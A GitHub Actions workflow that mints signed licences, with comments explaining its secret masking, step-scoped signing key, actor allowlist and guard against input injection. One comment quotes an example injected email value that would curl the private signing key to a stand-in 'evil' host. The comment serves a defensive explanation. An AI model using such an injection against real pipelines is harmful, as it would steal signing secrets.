name: Mint License

# Self-hosted license minting. See docs/specs/2026-04-11-license-mint-automation-design.md
# for the full design rationale and threat model.

on:
  workflow_dispatch:
    inputs:
      tier:
        type: choice
        description: 'License tier'
        options: [pro, enterprise]
        default: pro
        required: true
      org:
        description: 'Licensee organization'
        required: true
      email:
        description: 'Recipient email address'
        required: true
      seats:
        description: 'Number of seats'
        default: '1'
      months:
        description: 'Validity in months (max 24)'
        default: '12'
      notes:
        description: 'Internal notes (audit only, ≤500 chars)'
        default: ''
      dry_run:
        type: boolean
        description: 'Dry-run: mint + summarize only, no email, no audit commit'
        default: false
  repository_dispatch:
    types: [mint-license]

concurrency:
  group: license-mint
  cancel-in-progress: false

permissions:
  contents: read

jobs:
  mint:
    # workflow_dispatch is already maintainer-gated by GitHub. repository_dispatch
    # is not, so it needs an explicit actor allowlist.
    #
    # This used to compare github.actor against github.repository_owner, which
    # can NEVER match here: the owner is an Organization ("brunobola-portfolio")
    # while github.actor is always a user login. Every repository_dispatch mint
    # was therefore skipped — and skipped is not failed, so the "Notify on
    # failure" step never fired and the caller saw GitHub's 204 with no key ever
    # delivered. Gate on a login instead, overridable for forks via the
    # MINT_ACTOR repository variable.
    if: github.event_name == 'workflow_dispatch' || github.actor == (vars.MINT_ACTOR || 'brunobola')
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # LICENSE_PRIVATE_PEM is NOT at job level — it is injected only into the
    # two steps that actually need it (pre-emptive masking + mint), so the
    # checkout/setup-node/npm ci steps cannot read it even if compromised.
    steps:
      - name: Pre-emptive secret masking
        # Runs BEFORE checkout/Node. Any later step that accidentally prints
        # LICENSE_PRIVATE_PEM via a stack trace is redacted by the GH log
        # processor. Masking must happen at the workflow level — crashes
        # during Node module load would otherwise precede in-process masking.
        env:
          LICENSE_PRIVATE_PEM: ${{ secrets.LICENSE_PRIVATE_PEM }}
          # Bound to an env var, NOT interpolated into the script below.
          # `${{ }}` inside `run:` is substituted as raw text before the shell
          # parses it, so a caller-supplied email like `x"; curl -d @$LICENSE_
          # PRIVATE_PEM evil…; echo "` would execute — in the one step whose
          # environment carries the licence signing key. Reading "$RECIPIENT"
          # instead keeps the value data. This matters more now that
          # docs/guides/license-keys-and-portal.md documents feeding
          # customer-supplied addresses in via repository_dispatch.
          RECIPIENT: ${{ inputs.email || github.event.client_payload.email }}
        run: |
          echo "::add-mask::$LICENSE_PRIVATE_PEM"
          echo "::add-mask::$RECIPIENT"
      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0  # v7.0.0
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020  # v7.0.0
        with:
          # 24 to match every other workflow. The mint script's only runtime
          # dep is `jose` (a production dep, pure JS), so this job has no
          # native-module constraint of its own — it just tracks the project's
          # engines range (">=22.14 <25").
          node-version: '24'
          cache: 'npm'
      - name: Install dependencies
        # --ignore-scripts: dependency postinstall hooks are disabled so a
        #   compromised transitive dep can't run with LICENSE_PRIVATE_PEM
        #   in the environment. Combined with step-level secret scoping
        #   above, this step does not have LICENSE_PRIVATE_PEM in its env at all.
        # --omit=dev: trims the install footprint — the mint script only
        #   depends on `jose` at runtime, which is a production dep already.
        run: npm ci --ignore-scripts --omit=dev
      - name: Mint license
        env:
          # Only the private key is in secrets. The matching public key is
          # committed at keys/public.pem and read from disk by the mint script.
          LICENSE_PRIVATE_PEM: ${{ secrets.LICENSE_PRIVATE_PEM }}
          RESEND_API_KEY: ${{ secrets.RESEND_API_KEY }}
          LICENSE_LOG_PAT: ${{ secrets.LICENSE_LOG_PAT }}
          AUDIT_REPO: ${{ vars.AUDIT_REPO }}
          FROM_EMAIL: licenses@bolalabs.pt
          KID: ${{ vars.LICENSE_KID || 'k-default' }}
          TIER: ${{ inputs.tier || github.event.client_payload.tier }}
          ORG: ${{ inputs.org || github.event.client_payload.org }}
          EMAIL: ${{ inputs.email || github.event.client_payload.email }}
          SEATS: ${{ inputs.seats || github.event.client_payload.seats }}
          MONTHS: ${{ inputs.months || github.event.client_payload.months }}
          NOTES: ${{ inputs.notes || github.event.client_payload.notes }}
          DRY_RUN: ${{ inputs.dry_run || github.event.client_payload.dry_run || 'false' }}
          GITHUB_RUN_ID: ${{ github.run_id }}
        run: node scripts/mint-license-action.js
      - name: Notify on failure
        if: failure()
        env:
          RESEND_API_KEY: ${{ secrets.RESEND_API_KEY }}
        run: |
          node scripts/mint-failure-notify.js \
            --run-id "${{ github.run_id }}" \
            --repo "${{ github.repository }}" \
            --event "${{ github.event_name }}"
